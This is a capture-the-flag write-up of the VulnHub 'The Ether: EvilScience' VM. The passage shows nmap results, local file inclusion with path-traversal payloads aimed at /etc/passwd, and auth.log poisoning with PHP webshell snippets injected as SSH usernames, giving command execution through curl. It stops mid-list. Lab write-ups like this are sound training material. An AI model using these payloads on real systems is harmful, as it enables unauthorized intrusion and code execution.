# The Ether: EvilScience v1.0.1

This one immediately caught my attention for a number of reasons. For one thing, it has a plot - which always makes trying to get into a machine a bit more fun. It also purports to be very difficult:

`
This challenge is not for beginners. There is a relevant file on this machine that plays an important role in the challenge, do not waste your time trying to de-obfuscate the file, I say this to keep you on track. This challenge is designed test you on multiple areas and it’s not for the feint of heart!
`

The VM is available [here](https://www.vulnhub.com/entry/the-ether-evilscience-v101,212/) and is honestly the most challenging and enjoyable vulnerable VM I have attempted so far. It was strongly reminiscent of some of the harder OSCP labs, and I had a lot of fun doing it. All told, I would say that it took me about half a day to complete.

## Getting Started

As per usual, I began by running `netdiscover` to find the system on my host-only network. Then I ran a quick NMap scan:

```
Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-16 20:01 BST
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:86:D1:5D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Pretty standard results. We have an SSH server and a HTTP server to look at.

## The Ether

Visiting the webserver reveals a pretty standard website based on a template. It's built on PHP and consists of only a few pages, built on a free template called Carinary. Googling around for vulnerabilities related to the template or software versions produced little in the way of results, so I decided to poke around the server itself. It didn't take long, as there is very little functionality available to interact with.

The only thing that stood out to me was the URI. When you visit any page other than the homepage, you get a URL that looks something like this:

`http://192.168.56.101/index.php?file=research.php`

Obviously, the alarm bells immediately went off in my head: "LFI! LFI! LFI"!. It seems like a classic vector for file inclusion. To test whether this is indeed the case, I decided to download the Carinary template myself and have a look at what files it contains. After a couple false starts, I tried this:

`http://192.168.56.101/index.php?file=layout/styles/layout.css`

As we may have expected, this dumps the contents of the layout.css file at the top of our index.php page. It seems we have successful file inclusion - the question is, how can we leverage it to compromise the system?

## Enumerating the LFI

I decided to play around with the LFI a bit more to see what the limitations of my ability to read files is:

```
file=layout/styles/layout.css - successful file inclusion
file=../../../../../../../../../../../../../../../../../../../bin/ls = works
file=../../../../../../../../../../../../../../../../../../../etc/passwd = does not work
file=../../../../../../../../../../../../../../../../../../../var/www/html/index.html = default page
file=../../index.html = apache default page
file=/bin/ls = works
```

This confirms that I can include a variety of files - but not all of them. Some files I would expect to be able to access, like /etc/passwd and /etc/issue, are not accessible to - indicating that whole directories are out of the question. I also found that a lot of the files and directories I would normally use to get PHP code execution are not available, including:

* /var/log/apache2/access.log (and variants)
* /var/log/apache2/error.log (and variants)
* /proc/self/environ
* The php:// scheme is available, but does not seem to work for sending code via POSTDATA.
* The data:// scheme is available, but also does not seem to work for code inclusion.

At this point, getting frustrated, I started going through every file I thought that *may* be accessible. Finally, after a good hour or so of enumeration, I discovered a log file that I have the ability to read: `/var/log/auth.log`. Although special characters in the file caused by browser to get confused, I could access it with curl:

`curl "http://192.168.56.101/index.php?file=/var/log/auth.log"`

This file keeps a rolling record of attempts to login via SSH; including it gives us access to the contents of the file:

```
Nov 23 19:49:48 theEther sudo: pam_unix(sudo:session): session closed for user root
Nov 23 19:49:53 theEther login[842]: pam_unix(login:session): session closed for user evilscience
Nov 23 19:49:53 theEther systemd-logind[782]: Removed session 1.
Nov 23 19:50:00 theEther sshd[872]: Received signal 15; terminating.
Apr 19 16:02:53 theEther systemd-logind[701]: New seat seat0.
Apr 19 16:02:53 theEther systemd-logind[701]: Watching system buttons on /dev/input/event0 (Power Button)
Apr 19 16:02:53 theEther systemd-logind[701]: Watching system buttons on /dev/input/event1 (Sleep Button)
Apr 19 16:02:53 theEther systemd-logind[701]: Watching system buttons on /dev/input/event3 (Video Bus)
Apr 19 16:02:54 theEther sshd[752]: Server listening on 0.0.0.0 port 22.
Apr 19 16:02:54 theEther sshd[752]: Server listening on :: port 22.
Apr 19 16:02:54 theEther sshd[752]: Received SIGHUP; restarting.
Apr 19 16:02:54 theEther sshd[752]: Server listening on 0.0.0.0 port 22.
Apr 19 16:02:54 theEther sshd[752]: Server listening on :: port 22.
Apr 19 16:02:54 theEther sshd[752]: Received SIGHUP; restarting.
Apr 19 16:02:54 theEther sshd[752]: Server listening on 0.0.0.0 port 22.
Apr 19 16:02:54 theEther sshd[752]: Server listening on :: port 22.
Apr 19 16:04:59 theEther sshd[1067]: Invalid user test from 192.168.56.102
Apr 19 16:04:59 theEther sshd[1067]: input_userauth_request: invalid user test [preauth]
Apr 19 16:05:01 theEther sshd[1067]: Connection closed by 192.168.56.102 port 35362 [preauth]
Apr 19 16:05:27 theEther sshd[1069]: Invalid user  from 192.168.56.102
Apr 19 16:05:27 theEther sshd[1069]: input_userauth_request: invalid user  [preauth]
Apr 19 16:05:29 theEther sshd[1069]: Connection closed by 192.168.56.102 port 35366 [preauth]
```

## Getting RCE

It is possible to use the auth.log file to inject PHP code into a page, but it is not easy. Every time a nonexistent user tries and fails to connect via SSH, their username gets logged into the file and remains there until it rolls over. If we're careful with the number of characters we use and make sure to escape shell characters, we can use this property to get very short snippets of PHP code into the auth log.

The first step is to enumerate just how many characters we have to work with. After all, we only get one shot at this. If we inject a PHP snippet and it gets cut off before we get a chance to close it, the entire auth.log file will be useless to us until it rolls over. So I tried:

`ssh "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@192.168.56.101"`

By examining how many characters of the username made it into the included auth.log file, I was able to ascertain my character limit: 30 characters. This is difficult to work with, but doable. Next I tried injecting a simple PHP snippet to test that injection is actually possible

`ssh "<?php echo 'test'; ?>"@192.168.56.101`

This worked, and I could see the word "test" appearing in the contents of auth.log. After a little tinkering on my own machine to avoid breaking auth.log, I came up with the following series of injections:

```
ssh "<?php \$a=\$_GET['a']?>"@192.168.56.101
ssh "<?php echo system(\$a)?> "@192.168.56.101
```

I was able to test this with the following curl command:

`curl "http://192.168.56.101/index.php?file=/var/log/auth.log&a=ls"`

This worked, giving me access to the contents of the `/var/www/html/theEther.com/public_html/` directory.

## Improving My Shell

Although I had achieved a rudimentary PHP shell via /var/log/auth.log, there were a couple of problems with it:

* It was transient. The auth.log file cycles regularly, and after a while my shell will disappear.
*
